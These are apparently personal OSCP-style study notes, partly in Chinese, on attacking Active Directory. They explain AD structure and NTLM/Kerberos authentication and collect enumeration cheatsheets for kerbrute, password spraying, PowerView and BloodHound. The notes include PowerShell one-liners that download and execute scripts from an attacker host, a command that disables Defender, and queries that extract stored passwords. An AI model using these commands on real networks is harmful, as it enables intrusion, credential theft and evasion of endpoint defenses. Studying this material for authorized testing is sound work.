# AD attacks

AD 计划
1. 重读官方教程，配合视频教程，梳理/整理ad笔记
2. 学习ad渗透思路、过程，补充常用枚举工具使用
    > powerup, powerview, bloodhund
3. 域渗透横向移动，常用工具补充
    > impacket, pyexec； 待补充
    > [常见横向移动和域控权限维持](https://xz.aliyun.com/t/9382); done, 与委派暂未学习；
4. Ad 相关lab练习
    > htb: Forest, Sauna
    > pg: Hutch, Heist & Vault(redo) [official post](https://i.imgur.com/GX9CQRg.jpg)


**worth to read**
+ [Red Teaming Experiments--Ad&Kerberous abuse](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
+ [OSCP-Review](https://marmeus.com/post/OSCP-Review), try hack me资源，含教程和room，视频；
+ https://github.com/61106960/adPEAS
+ Look up "Zero to Hero" by The Cyber Mentor (TCM) on YouTube in terms of learning resources.You'll want week 7,8,9
+ Check out the ethical hacking course by the cyber mentor. There is a free version of it on YouTube and I think it contains the AD section aswell. Really good content.
+ This is also a very good resource, although it's theory [https://zer1t0.gitlab.io/posts/attacking_ad/](https://zer1t0.gitlab.io/posts/attacking_ad/)
+ [Active Directory penetration testing cheatsheet](https://infosecwriteups.com/active-directory-penetration-testing-cheatsheet-5f45aa5b44ff)
+ [Active-Directory-Exploitation-Cheat-Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#asreproast)
+ Windows & Active Directory Exploitation Cheat Sheet and Command Reference
  https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/

**ad lab resource**
+ Ad setting up, Detection lab;
    > https://shroudri.github.io/guides/setting-up-active-directory/)
    > https://www.youtube.com/watch?v=0-ct0FC_P-M&feature=youtu.be
    > https://github.com/clong/DetectionLab
+ ad lab from reddit
    > Windows boxes: Jacko, UT99 and Meathead. I insist that it is good practice to do as many as you can. [reddit post](https://www.reddit.com/r/oscp/comments/seg1oh/i_challenge_you_to_crack_this_machine_domain/)
+ ad lab git
   lab git ：go to [https://github.com/Orange-Cyberdefense](https://github.com/Orange-Cyberdefense)
+ other  post usefule
https://www.reddit.com/r/oscp/comments/rd8udf/good_ad_resource/



## Basic Overview 

### AD DS data store
The Active Directory Data Store holds the databases and processes needed to store and manage directory information such as users, groups, and services
+ Contains the NTDS.dit - a database that contains all of the information of an Active Directory domain controller as well as password hashes for domain users
+ Stored by default in %SystemRoot%\NTDS
+ accessible only by the domain controller

### about Forest 
A forest is a collection of one or more domain trees inside of an Active Directory network. It is what categorizes the parts of the network as a whole.

The Forest consists of these parts:

+ Trees - A hierarchy of domains in Active Directory Domain Services
+ Domains - Used to group and manage objects 
+ Organizational Units (OUs) - Containers for groups, computers, users, printers and other OUs
+ Trusts - Allows users to access resources in other domains
+ Objects - users, groups, printers, computers, shares
+ Domain Services - DNS Server, LLMNR, IPv6
+ Domain Schema - Rules for object creation

### Users and Groups
when you create a domain controller it comes with default groups and two default users: Administrator and guest

**Users are the core to Active Directory,  four main types of users in the AD**
+ Domain Admins - This is the big boss: they control the domains and are the only ones with access to the domain controller.
+ Service Accounts (Can be Domain Admins) - These are for the most part never used except for service maintenance, they are required by Windows for services such as SQL to pair a service with a service account
+ Local Administrators - These users can make changes to local machines as an administrator and may even be able to control other normal users, but they cannot access the domain controller
+ Domain Users - These are your everyday users. They can log in on the machines they have the authorization to access and may have local administrator rights to machines depending on the organization.

**Groups make it easier to give permissions to users and objects by organizing them into groups with specified permissions.**
There are two overarching types of Active Directory groups: 
+ Security Groups - These groups are used to specify permissions for a large number of users
+ Distribution Groups - These groups are used to specify email distribution lists. As an attacker these groups are less beneficial to us but can still be beneficial in enumeration

**default security groups**
+ Domain Controllers - All domain controllers in the domain
+ Domain Guests - All domain guests
+ Domain Users - All domain users
+ Domain Computers - All workstations and servers joined to the domain
+ **Domain Admins** - Designated administrators of the domain
+ **Enterprise Admins** - Designated administrators of the enterprise
+ **Schema Admins** - Designated administrators of the schema
+ DNS Admins - DNS Administrators Group
+ DNS Update Proxy - DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).
+ **Allowed RODC Password Replication Group** - Members in this group can have their passwords replicated to all read-only domain controllers in the domain
+ Group Policy Creator Owners - Members in this group can modify group policy for the domain
+ Denied RODC Password Replication Group - Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
+ Protected Users - Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.
+ Cert Publishers - Members of this group are permitted to publish certificates to the directory
+ Read-Only Domain Controllers - Members of this group are Read-Only Domain Controllers in the domain
+ Enterprise Read-Only Domain Controllers - Members of this group are Read-Only Domain Controllers in the enterprise
+ Key Admins - Members of this group can perform administrative actions on key objects within the domain.
+ Enterprise Key Admins - Members of this group can perform administrative actions on key objects within the forest.
+ Cloneable Domain Controllers - Members of this group that are domain controllers may be cloned.
+ RAS and IAS Servers - Servers in this group can access remote access properties of users


### about ldap
> DC,(Domain     Component)
> CN=Common Name 为用户名或服务器名，最长可以到80个字符，可以为中文；
> OU=Organization Unit为组织单元，最多可以有四级，每级最长32个字符，可以为中文；
> O=Organization 为组织名，可以3—64个字符长
> C=Country为国家名，可选，为2个字符长

### Auth hash

> + Windows内部是不保存明文密码的，只保存密码的hash。
> + 本机用户的密码hash是放在本地的SAM文件 里面，域内用户的密码hash是存在域控的NTDS.DIT文件里面。
> + SAM文件位置：%SystemRoot%\system32\config\sam
> + 登录时系统自动地读取SAM文件中的“密码”与输入的“密码”进行对比，如果相同，则认证成功

**密码格式**
> + AAD3B435B51404EEAAD3B435B51404EE 是LM Hash
> + 31D6CFE0D16AE931B73C59D7E0C089C0是NTLM Hash
```bash
Username : RID : LM Hash : NTLM hash
Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0:::
```

**系统版本对LM 和 NTLM 的支持**
> Y：当密码超过14位时使用的加密方式 
> X：系统默认使用的加密方式
> Windows Vista 和 Windows Server 2008开始，默认情况下只存储NTLM Hash，LM Hash将不再存在

|OS|LM|NTLM|
|:------|:------|:------|
|2000|X|Y|
|XP|X|Y|
|2003|X|Y|
|Vista||X|
|windows 7||X|
|windows 2008||X|
|windows 8||X|
|windows 2012| |X|

### NTLM auth
https://www.cnblogs.com/backlion/p/7856115.html

NTLM, NT Lan Manager
authentication process:
client, app server, Domain Controller: authentication service

* step1: calculate NTLM hash. 
> client calculate NTLM hash from user's password
* step2: send Username.
> client send the username to app server
* step3: Nonce.
> app server returns a random value, called nonce or challenge
* step4: Response(Encrypted nonce).
> client encrypts the nonce using NTLM hash, send it to app server
* step5: Response(username, nonce). 
> app server forwards response along with username and nonce to DC.
* Step6: Encrypt nonce with NTLM hash of user and compare to response. 
> DC perform validation, encrypt challenge itself with NTLM hash(dc knows NTLM hash of all users) and compare to the reponse
* Step7: Approve authentication
![](https://filestore.community.support.microsoft.com/api/images/45bc59ef-a2e7-4a75-a129-8be12a01dd16?upload=true)

### Kerberos auth
p645
https://y4er.com/tags/kerberos/
https://blog.csdn.net/sky_jiangcheng/article/details/81070240
[hacktricks - kerberos auth](https://book.hacktricks.xyz/windows/active-directory-methodology/kerberos-authentication)

**basic info**
+ 1-the default authentication protocol in Active Directory and for associated services 
+ 2-used by Microsoft is adopted from  the Kerberos version 5 authentication protocol created by MIT
+ 3-Microsoft's primary authentication mechanism since win server 2003 use a ticket system
+ Kerberos is stateless, send session key to client

**role**
> client
> app server
> Domain Controller:the role of a key distribution center(KDC), authentication server service

**authentication process**
A: when a user logs in to their workstation
* step1: Authentication Server Request.
> AS_REQ, Authentication Server Request
contains a timestamp encrypted using a hash(derived from user password) and username
* step2: Authentication Server Reply.
> Authentication, decrypt the timestamp, if the decryption process is successful and timestamp is not duplicate(a potential replay attack), authentication is ok.
> AS_REP, Authentication Server Reply. Contains a session key(encrypted using user's password hash) and TGT.
TGT, Ticket Granting Ticket. Contains user's info, including group membership, domain, timestamp, IP address of client, session key.
TGT encrypetd by a secret key(krbtgt, only KDC know), avoid tampering. valid for 10 hours.

B: user wish to access resources of the domain
* step3: Ticket Granting Service Request.
> client constructs a TGS.
TGS consists of the current user, a timestamp(encrpted using the session key), SPN of the resource, encrypted TGT.
* step4: Ticket Granting Service Reply.
if SPN exist
> KDC decrypt the TGT using secret key, extract session key
> decrypt username and timestamp
> KDC checks:
> a)TGT must have a valid timestamps(no replay detect and the request )
> b)The username from the TGS_REQ has to match the username from the TGT.
> c)The client IP address needs to coincide with the TGT IP address.
> if verification prcess succeeds, TGS respond to the client with a TGS_REP.
> TGS_REP, Ticket Granting Server Reply. contains three parts:
> a) SPN to which access has benn granted
> b) a session key to be used between client and spn
> c) a service ticket contains the username and group memberships along with the newly-created session key.
> a and b encrypted using the session key associated with the creation of TGT, c encrypted using the password hash ofthe service account registered with the SPN 

C: Service authentication begins
* step5: Application Request.
> client send to application server an AP_REQ.
> AP_REQ, application request. Contains username and timestamp(encrypted with the session key associated the service ticket), service ticket
* Step6: Service Authentication.
> decrypts the service ticket using service account password hash, extracts username and session key.
> then uses the session key(from service ticket) decrypts the username from AP_REQ.
> if AP_REQ username matches username decrypted from service ticket, request is accepted.
> Before access is granted, service inspects the supplied group memberships in service ticket and assigns appropriate permissions to user.

![](https://filestore.community.support.microsoft.com/api/images/c67335e9-6bad-405e-a2a7-91c400818fba?upload=true)

## attack vector

domain info
> domain name

Users
> high value users; administrator, domain admin users, service account
> logon users

Group
> high value groups

Password/NTLM hash
> enum/get NTLM hash/password
> logon user, dump ntlm hash
> service account attack, kerboroast
> passowrd spraying

lateral movement
> pth, pash the hash; works for ntlm auth
> overpass the hash; works for kerberos auth
> pass the ticket; silver ticket
> DCOM; RCE

## Cheatsheet

[wadcoms](https://wadcoms.github.io/)

## Enum(no creds/session)-- to do later
+ Pentest network, find open port to exploit vulnerablity or extract credentials
+ check for null and guest access on smb service
+ ladp enum, 
+ smbshare, groups.xml contains the crypted passwod. gpp-decrypt
+ poison the network(responder, evil-ssdp, realy attack); more than oscp
+ osint, other external methond; more than oscp

### net/service

```bash
# smb
enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>
smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>
smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //

# ldap
nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>

```

### User enum
+ user name guess/brute
  > invalid/valid username is requested, server respond with different kerberos error code.
  invalid username, _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_
  valid usernme, _TGT in a AS-REP_ or error _KRB5KDC_ERR_PREAUTH_REQUIRED_
+ knowing usernames, ASREPRosat/Password Spraying
+ userenum via udp, [pykerbrute](https://github.com/3gstudent/pyKerbrute)
+ user enum list, seclist /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+ user list generate, [namemash](https://gist.github.com/superkojiman/11076951)

```bash
# username enum, dc port 88
## kerbrute on mac arm64, https://www.reddit.com/r/oscp/comments/wkyrq8/kerbrute_in_arm_based_kali/
./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt
kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
kerbrute userenum --dc CONTROLLER.local -d 192.168.159.200 User.txt

## user.txt, both work
admin
admin@domain.com

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

# cme cheatsheet
## https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/
crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq

# psssword spraying
# https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1
Invoke-SprayEmptyPassword.ps1

# pykerbrute, support udp, also able to passwordspray with ntlm hash
## https://xz.aliyun.com/t/8690#toc-11
python2 EnumADUser.py 192.168.60.1 test.com user.txt tcp
python2 EnumADUser.py 192.168.60.1 test.com user.txt udp

python2 ADPwdSpray.py 192.168.60.1 hacke.testlab user.txt clearpassword QWE123!@# tcp
python2 ADPwdSpray.py 192.168.60.1 hacke.testlab user.txt ntlmhash 35c83173a6fb6d142b0359381d5cc84c udp
```

## Enum(Creds/Session)

[ad域渗透总结](https://blog.51cto.com/u_13953961/3107150), 包括枚举、漏洞、持久化、提权、密码攻击等。
[域渗透总结](https://wh0ale.github.io/2018/12/19/2018-12-19-%E5%9F%9F%E6%B8%97%E9%80%8F/), 介绍内网和域基本概念，域渗透命令、远程命令；

### Domain joined
+ 是否为域主机

```bash
# method1:查看 dns 后缀, nslookup
ipconfig /all 
nslookup test.lab

# method2:systeninfo查看domain，logon server
systeminfo

# method 3
# logon domain, dns
# current user
# computer name
net config workstation

# method 4: ntp
# result1: 命令成功完成；存在域且当前用户为域用户
# result2: 发生系统错误 5; 存在域且当前用户不是域用户
# result3: 找不到workgroup的域控制器；不在域内
net time /domain
```

### Alive Host
+ 横向移动前，探测域内的存活主机
+ 利用NetBIOS协议探测，[nbtscan](https://sectools.org/tool/nbtscan)
  > NBTScan，扫描IP网络以获取NetBIOS名称信息的程序。向提供的范围内的IP地址发送一个NetBIOS状态查询，以人类可读的形式列出接收到的信息，包括：IP，NetBIOS计算机名，login User， Mac
+ 利用ICMP协议
+ Nishang, [github](https://github/samratashok/nishang)
+ ARPscan, [tool]()
+ power empire Invoke-ARPScan

```bash
# nbtscan, 1.0.35 
# token-sharing, running file and print sharing service
# token-dc, dc server
nbtscan.exe 10.10.10.0/24

# ICMP
# for循环，从1到254每次增长1，执行ping命令，过滤TTL(即存活的主机)
# /L $var in (start,step,end) do cmd, 增量序列 执行循环
# @ping, 不回显每次执行的cmd命令
# -w 1, ping timeout milisec
# -n 1, packet count to send
for /L %i in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%i | findstr "TTL="

# arpscan 
arpscan -t [IP/slash] or [IP]
arpscan -t 10.10.10.0/24

# power empire  Invoke-ARPScan
Invoke-ARPScan -CIDR 10.10.10.0/24  > c:\windows\temp\arplog.txt
```

### Port scan
+ focus on banner, service and version, vulnerablity and exploit
+ scan with telnet or nc
+ scan with Invoke-portscan.ps1 from [powersploit](https://github.com/PowerShellMafia/PowerSploit)
+ F-NAScan, python2 scan tool

```bash
# telnet, 可能未安装
telnet IP port

nc ip port

# MSF
search portscan

# download file or string to execute
import-module Invoke-Portscan.ps1
Invoke-Portscan -Hosts 10.10.10.10 -Ports '1-65535'
Invoke-Portscan -Hosts 10.10.10.10 -Ports '21,22,25,80'

powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://kaliip/Invoke-Portscan.ps1');Invoke-Portscan -Hosts 10.10.10.10 -Ports '1-65535'"

```

### Domain info
+ search domain
+ domain computers
  > 机器用户/账号, 机器名$
+ domain users and groups
  > **Enterprise Admins**, 域林管理员组，最高权限
  > **Domain Admins**, 域管理员，默认加入localgroups组
+ domain account password rule
+ domain trusts
  > 域林信任关系**可传递**、**双向信任**

```bash
# domain, need dc
net view /domain        

# domain computers
net view /domain:testdomain 

# users and groups
net group /domain

# domain computers
net group "domain computers" /domain

# account password rule
net accounts /domain
gpupdate /force         # 强制更新组策略

# trust list
nltest /domain_trusts
```

### Domain Controller
+ DC server list, could have multi dc
+ DC hostname from ldap srv
  > DNS中SRV的资源记录类型表示服务的位置；通过查询ldap的服务位置获取dc
+ net time to get dc
+ netdome 

```bash
# dc list
nltest /dclist:domainname

# dc hostname via ldap's dns srv
nslookup -type=srv _ldap._tcp

net time /domain 

net group "Domain Controllers" /domain

# pdc, primary dc
netdom query pdc
```

### user/admin groups
+ domain user list
+ domain admins 
+ krbtgt account
  > 创建TGS的加密密钥，可用于实现多种域内权限维持/持久化
+ domain admin groups

```bash
net user /domain
net user user1 /domain 

# sid, status
# /format:htable, html table format
wmic useraccount get /all
wmic useraccount get /all /format:htable > c:\windows\temp\user.html

# dsquery, need to execute on dc
dsquery user

# 域的管理员组
net localgroup administrators /domain

net groups "domain admins" /domain
net groups "enterprise admins" /domain

# other
wmic useraccount get name, sid
Get-DomainUser
GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username # linux
enum4linux -a -u "user" -p "password" <DC IP> # linux

```

### Domain admin
+ locate domain admin
+ from analyse local administrator log 
+ from sessions of domain server
  > psloggedon, 查看本地及远程登录用户;[downlink](https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon)
  > PVEFindADUser, 查找活动目录用户登录的位置、枚举域用户、查找在特定计算机上登录的用户，包括本地用户、服务用户、计划任务用户等；[github](https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn)
  > powerview, 

```bash
# -l, local logged on
psloggendon 

# -current, current loggedon user in domain
# processing host, loggedon user
pvefindaduser -current

powershell.exe -exec bypass -Command "& {import-Module c:\powerview.ps1; Invoke-UserHunter}"
```

### Enum SPN
kerberos cheatsheet
https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

**SPN**: Service Principal Names
+ Service Principal Name (SPN) is used to associate a service on a specific server to a service account in Active Directory.
+ service account enum.target service account, may be members of high value groups,predefined account:localsystem,localservice, networkservice 
+ enum spns, exchange,sql, IIS
+ can obtain the IP and port number of applications running on server integrated with target AD
+ serviceclass/host:port/servicename
  > serviceclass可以理解为服务的名称，常见的有www,ldap,SMTP,DNS,HOST等
  > host有两种形式，FQDN和NetBIOS名，例如server01.test.com和server01
  > 如果服务运行在默认端口上，则端口号(port)可以省略


**Get-SPN.ps1**
[get-spn git](https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/Get-SPN.ps1)

```bash
//domain user or localsystem from domain computer
Get-SPN -type group -search "Domain Admins" -List yes | Format-Table –Autosize

//list all registered sql servers 
Get-SPN -type service -search "MSSQLSvc*" -List yes | Format-Table –Autosize

//list all serviceprincipalName entries for domain users match string
Get-SPN -type user -search "*svc*" -List yes

//list all spn with credential, need input password（why？）； login with offsec，
Get-SPN -type service -search "*svc*" -List yes -Credential domain\user

Get-SPN -type service -search "*" -List yes -DomainController 172.16.196.5 -Credential corp.com\offsec
Get-SPN -type service -search "*" -List yes -DomainController 172.16.196.5 -Credential offsec

# powerview
get-domainuser -spn | select samaccountname,serviceprincipalname

# setspn
## 查看域内所有的spn
setspn.exe -q */*

## 查看指定域内的spn
setspn.exe -T hacke.testlab -q */*

## 添加spn
setspn.exe -U -A VNC/WIN7.hacke.testlab test
```

**traditional ps**
```powershell
#-detect registered service principal names
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter = "serviceprincipalname=*http*"
$Result = $Searcher.FindAll()
Foreach ($obj  in  $Result) {
    Foreach ($prop  in  $obj.Properties) {
        $prop
    }
}

#-nslookup serviceprincipalname entry
nslookup CorpWebServer.corp.com

[System.Net.Dns]::GetHostAddresses($server)
$test = [System.Net.Dns]::GetHostAddresses($server)
$test[0].IPAddressToString

$IpAddress = [System.Net.Dns]::GetHostAddresses("www.example.com") | select IPAddressToString -ExpandProperty IPAddressToString
```


### Enum logon user
**derivative local admin**
[more info](https://medium.com/@sixdub/derivative-local-admin-cdd09445aac8)
+ find logged-in users that are members of high-value groups since  their credential will be cacheed in memory
+ steal credential and authenticate with them.
+ exploit map，get one of the Domain Admins -- take over entire domain.
+ enum computer in domain
+ enum logon user in list
+ find domain controller, file server, NetSessionEnum on dc, ftp server to enum active user's session

powerview 
https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1

```bash
#-list users logged on, need local admin privileges
NetWkstaUserEnum
#-enum all active users' sessions on server, need domain user 
NetSessionEnum

# powerview
Import-Module .\PowerView.ps1
#-get logged on users, same to NetWkstaUserEnum
Get-NetLoggedon -ComputerName client251
# same to NetSessionEnum
Get-NetSession -ComputerName dc01


//download powerview.ps1 and load, execute without saving file 
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.196/powerview.ps1')"
Get-NetLoggedon -ComputerName DC01
```


### PowerView 
+ [powerview git src](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
+ [powerview document](https://powersploit.readthedocs.io/en/latest/Recon/)
+ [hacktricks cheatsheet](https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters/powerview)
+ [Offensive cheatsheet](https://cheats.philkeeble.com/active-directory/enumeration#privesc)

```powershell
# disable defender
Set-MpPreference -disablerealtimeMonitoring $true

Import-Module powerview.ps1
.\powerview.ps1

# domain user creds
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)

# quick enum ad
Get-NetDomain #Basic domain info

# domain controller
get-netdomaincontroller | select forest,name,osversion

# domain forest
get-netforestdomain
## Domain trusts
Get-NetDomainTrust #Get all domain trusts (parent, children and external)
Get-NetForestDomain | Get-NetDomainTrust #Enumerate all the trusts of all the domains found

## domain policy
get-domainpolicydata 
## 密码策略
get-domainpolicydata | select -expandproperty systemaccess

## GPO policy
get-netgpo | select displayname

# User info
Get-netuser | select samaccountname

Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount ## ## Basic user enabled info
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
## ASREPRoastable users
Get-NetUser -PreauthNotRequired 

## SPN user
Get-NetUser -SPN #Kerberoastable users
get-netuser -spn | select samaccountname, serviceprincipalname

# Groups info
Get-NetGroup | select samaccountname, admincount, description

## domain admins member
get-netgroupmember -identity "domain admins" | select membername
Get-DomainGroupMember "Domain Admins" | select -ExpandProperty membername

Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=EGOTISTICAL-BANK,DC=local' | %{ $_.SecurityIdentifier } | Convert-SidToName #Get AdminSDHolders

# Computers
get-netcomputer | select name, dnshostname,samaccountname, operatingsystem
## Find any machine accounts in privileged groups
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} 
## DCs always appear but aren't useful for privesc
Get-NetComputer -Unconstrained | select samaccountname
## Find computers with Constrained Delegation 
Get-NetComputer -TrustedToAuth | select samaccountname, dnshostname,msds-allowedtodelegateto | fl

# Shares, accessable smb share, could be leteral move
Find-DomainShare -CheckShareAccess #Search readable shares
Find-DomainShare -Domain testlab.local -Credential $Cred

# 用户登录的域主机，默认为域管理员登录的主机
find-domainuserlocation |select username,sessionfromname

# 枚举会话信息，本地/远程主机
get-netsession -ComputerName dc-1 | select CName, username 

#LHF
#Check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl

#Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
Find-LocalAdminAccess

#Get members from Domain Admins (default) and a list of computers and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host. If -Checkaccess, then it also check for LocalAdmin access in the hosts.
Invoke-UserHunter -CheckAccess

#Find interesting ACLs
Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights | fl

# domain
Get-NetDomain
Get-NetDomain -Domain domain.local

Get-DomainSID  # get domain sid
Get-DomainSID -Domain domain.local

Get-DomainPolicy # get domain policy
(Get-DomainPolicy)."systemaccess"
(Get-DomainPolicy –domain moneycorp.local)."system access"

Get-NetDomainController # get dc
Get-NetDomainController –Domain moneycorp.local 

# domain user
Get-DomainUser | select name # get domain user
Get-domainUser –name student1

# domain groups
Get-NetGroup | select name
Get-NetGroup *admin* | select name
Get-NetGroup -UserName Alice
Get-NetGroup "Domain Admins"

# low-hang fruit
##Check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl

##Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
Find-LocalAdminAccess

##(This time you need to give the list of computers in the domain) Do the same as before but trying to execute a WMI action in each computer (admin privs are needed to do so). Useful if RCP and SMB ports are closed.
.\Find-WMILocalAdminAccess.ps1 -ComputerFile .\computers.txt

##Enumerate machines where a particular user/group identity has local admin rights
Get-DomainGPOUserLocalGroupMapping -Identity <User/Group>

##Goes through the list of all computers (from DC) and executes Get-NetLocalGroup to search local admins (you need root privileges on non-dc hosts).
Invoke-EnumerateLocalAdmin

##Search unconstrained delegation computers and show users
Find-DomainUserLocation -ComputerUnconstrained -ShowAll

##Admin users that allow delegation, logged into servers that allow unconstrained delegation
Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation

##Get members from Domain Admins (default) and a list of computers and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host. If -Checkaccess, then it also check for LocalAdmin access in the hosts.
Invoke-UserHunter [-CheckAccess]

##Search "RDPUsers" users
Invoke-UserHunter -GroupName "RDPUsers"

##It will only search for active users inside high traffic servers (DC, File Servers and Distributed File servers)
Invoke-UserHunter -Stealth
```

### BloodHound
BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. Defenders can use BloodHound to identify and eliminate those same attack paths. Both blue and red teams can use BloodHound to easily gain a deeper understanding of privilege relationships in an Active Directory environment.

+ bloodhound,[bloodhound](https://github.com/BloodHoundAD/BloodHound)
+ bloodhound py, [bloodhound py](https://github.com/fox-it/BloodHound.py)
+ [hacktricks bloodhound](https://book.hacktricks.xyz/windows/active-directory-methodology/bloodhound)
+ error and solution, https://www.cnblogs.com/mrhonest/p/13424798.html
+ bloodhound 4.0.1 works, lastest version or bloodhound from kali apt is not able to upload data(NaN%)
+ bloodhound search
  > node info: first degree control, first degree group member
  > query: all domain admins, kerberoast, asrepoast, path to admins ...

**Installation**
```bash
# not recommand.
## not latest, and error while upload data NaN%
apt-get install bloodhound 

# latest, down pre-compiled bloodhound latest version
# https://github.com/BloodHoundAD/BloodHound/releases
# or compile from source
# community version ofneo4j, https://neo4j.com/download-center/#community

# install neo4j, download the community edition;
## https://neo4j.com/download-center/#community
## login with neo4j:neo4j, localhost:7474
## change the password.
unzip neo4j-xx.zip
./bin/neo4j start

# install bloodhound.
## download 4.0.1 zip file
## unzip and run bloodhound
chmod +x Bloodhound
./Bloodhound

# collect data
./SharpHound.exe --CollectionMethods All

. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
Invoke-BloodHound -CollectionMethod All -Domain test.local
Invoke-BloodHound -CollectionMethod All -Domain test.local -ZipFileName loot.zip 

## If you wish to execute SharpHound using different credentials you can create a CMD netonly session and run SharpHound from there:
runas /netonly /user:domain\user "powershell.exe -exec bypass"

## python bloodhound collector
## https://github.com/fox-it/BloodHound.py
bloodhound-python -u support -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all

# bloodhound search 
## spn user
MATCH(u:User {hasspn:true}) RETURN u

## 设置委托的主机
MATCH(c:Computer),(t:Computer),p=((c)-[:AllowedToDelegate]->(t)) RETURN p

## 从 spn用户到domain admins 最短攻击路径
MATCH(u:User {hasspn:true}),(c:Computer),p=shortestPath((u)-[*1..]-(c)) RETURN p
```

**bloodhound py**

```bash
# python bloodhound enum
pip install bloodhound

## -c ALL - All collection methods
## -u support -p #00^BlackKnight - Username and password to auth as
## -d blackfield.local - domain name
## -dc dc01.blackfield.local - DC name (it won’t let you use an IP here)
##-ns 10.10.10.192 - use 10.10.10.192 as the DNS server
bloodhound-python -c All -u support -p '#00^BlackKnight' -d blackfield.local -dc dc01.blackfield.local -ns $ti
```

### via-powershell
powershell cmdlets Get-ADUser
+ on dc, may be install on win7 and up
+ key info, **samAccountType**, which is an attribute that all user, computer, and group objects have.


```powershell
# powershell help
get-command  "*group*"
help command -examples

//LDAP provider path format
LDAP://HostName[:PortNumber][/DistinguishedName]

//get domain
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

//samaccountType
https://msdn.microsoft.com/en-us/library/ms679637(v=vs.85).aspx

# list and print all user
# ldap path: LDAP://DC01.corp.com/DC=corp,DC=com
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry($SearchString, "corp.com\offsec", "lab")
$Searcher.SearchRoot = $objDomain
$Searcher.filter = "samAccountType=805306368"
$Result = $Searcher.FindAll()
Foreach ($obj  in  $Result) {
    Foreach ($prop  in  $obj.Properties) {
        $prop
    }
    Write-Host  "------------------------"
